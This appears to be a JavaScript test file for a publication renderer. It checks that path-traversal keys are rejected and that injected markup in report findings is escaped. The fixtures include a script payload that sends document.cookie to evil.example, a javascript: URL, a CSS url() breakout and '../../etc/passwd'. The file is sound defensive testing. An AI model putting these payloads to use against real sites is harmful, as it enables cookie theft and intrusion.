// Phase 0, Part 8: security and tenant-isolation tests for the Publication
// Rendering Engine V2 foundation. Scope note: Phase 0 only touches the public
// flagship sample library (a fixed, admin-controlled catalog), never real
// customer/tenant data, so "cross-tenant isolation" here means proving
// arbitrary/unapproved keys can never reach the new renderer.
import test from 'node:test';
import assert from 'node:assert/strict';
import { buildFlagshipSampleReport } from '../src/flagship-sample-library.js';
import { adaptFlagshipModelToPrintLayout, isPublicationV2Eligible } from '../src/publication-render-engine-v2.js';
import { composePrintReadyHtml } from '../src/print-composer.js';

const PREVIEW_ENABLED_ENV = { ENVIRONMENT: 'preview', PUBLICATION_RENDERER_V2_ENABLED: 'true', BROWSER: {} };

test('an arbitrary/unapproved publication key is rejected by both the catalog and the eligibility gate', () => {
  assert.equal(buildFlagshipSampleReport('../../etc/passwd'), null);
  assert.equal(buildFlagshipSampleReport('some-random-customer-report'), null);
  assert.equal(isPublicationV2Eligible(PREVIEW_ENABLED_ENV, 'some-random-customer-report', 'pdf'), false);
});

test('script-tag content in a finding is neutralized, never emitted as live markup', () => {
  const model = buildFlagshipSampleReport('national-human-development');
  model.report.findings = [{ text: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' }];
  const layout = adaptFlagshipModelToPrintLayout(model);
  const html = composePrintReadyHtml(layout, null, {});
  assert.ok(!html.includes('<script>fetch'), 'raw script tag must not appear unescaped in rendered HTML');
  assert.ok(html.includes('&lt;script&gt;'), 'script tag must be HTML-escaped, not stripped silently');
});

test('a javascript: URL smuggled into a finding is rendered as inert escaped text, not a live link', () => {
  const model = buildFlagshipSampleReport('national-human-development');
  model.report.limitations = ['javascript:fetch(String.fromCharCode(104,116,116,112))'];
  const layout = adaptFlagshipModelToPrintLayout(model);
  const html = composePrintReadyHtml(layout, null, {});
  assert.ok(!/<a\b[^>]*href=["']javascript:/i.test(html), 'javascript: URL must never appear as a live href');
});

test('CSS url() injection in a finding cannot break out of the escaped text node', () => {
  const model = buildFlagshipSampleReport('national-human-development');
  model.report.findings = [{ text: '</p><style>body{background:url(https://evil.example/track.png)}</style><p>' }];
  const layout = adaptFlagshipModelToPrintLayout(model);
  const html = composePrintReadyHtml(layout, null, {});
  assert.ok(!html.includes('<style>body{background:url(https://evil.example'), 'injected style/url content must not reach the DOM as live markup');
});

test('the Phase 0 adapter never embeds an <img> tag, so no image-URL SSRF surface is introduced', () => {
  const model = buildFlagshipSampleReport('national-human-development');
  const layout = adaptFlagshipModelToPrintLayout(model);
  const html = composePrintReadyHtml(layout, null, {});
  assert.ok(!/<img\b/i.test(html), 'Phase 0 adapter output must not reference any external image asset');
});

test('the adapter tolerates a malformed/near-empty publication model without throwing', () => {
  assert.doesNotThrow(() => adaptFlagshipModelToPrintLayout({}));
  assert.doesNotThrow(() => adaptFlagshipModelToPrintLayout({ report: {}, full_publication: {} }));
  const layout = adaptFlagshipModelToPrintLayout({});
  assert.ok(Array.isArray(layout.sections));
});

test('a large findings array does not crash HTML composition (basic size sanity, not a hard limit)', () => {
  const model = buildFlagshipSampleReport('national-human-development');
  model.report.findings = Array.from({ length: 5000 }, (_, i) => ({ text: `Synthetic finding number ${i}` }));
  assert.doesNotThrow(() => {
    const layout = adaptFlagshipModelToPrintLayout(model);
    composePrintReadyHtml(layout, null, {});
  });
});
